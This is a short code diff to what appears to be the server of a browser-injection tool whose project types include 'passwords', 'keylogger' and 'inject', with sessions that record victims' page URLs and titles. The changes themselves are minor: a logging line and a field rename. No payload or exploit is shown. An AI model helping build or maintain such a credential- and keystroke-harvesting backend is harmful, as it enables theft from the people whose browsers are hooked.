@@ -584,6 +584,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
 
     socket.on('project:read', project => {
+      console.log('project:read')
       if (project.name && globalToken) {
         if (project.type === 'overview' || project.type === 'passwords' || project.type === 'keylogger' || project.type === 'inject' || project.type === 'config') {
           type = project.type
@@ -1396,7 +1397,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
             'title': '',
             'url': authReq.headers.referer,
             'favicon': authReq.headers.referer ? 'https://plus.google.com/_/favicon?domain_url=' + encodeURIComponent(authReq.headers.referer) : '',
-            'focused': false,
+            'active': false,
           },
           'socket': {
             'headers': socket.headers,
@@ -1520,13 +1521,13 @@ MongoClient.connect(config.mongodb, (err, client) => {
              */
             if (typeof data === 'object') {
               if (typeof data.window === 'object') {
-                let { title, url, focused } = data.window
+                let { title, url, active } = data.window
                 if (typeof title === 'string')
                   session.window.title = title.substring(0, maxStringLength)
                 if (typeof url === 'string')
                   session.window.url = url.substring(0, maxUrlLength)
-                if (typeof focused === 'boolean')
-                  session.window.focused = focused
+                if (typeof active === 'boolean')
+                  session.window.active = active
               }
             }
           })
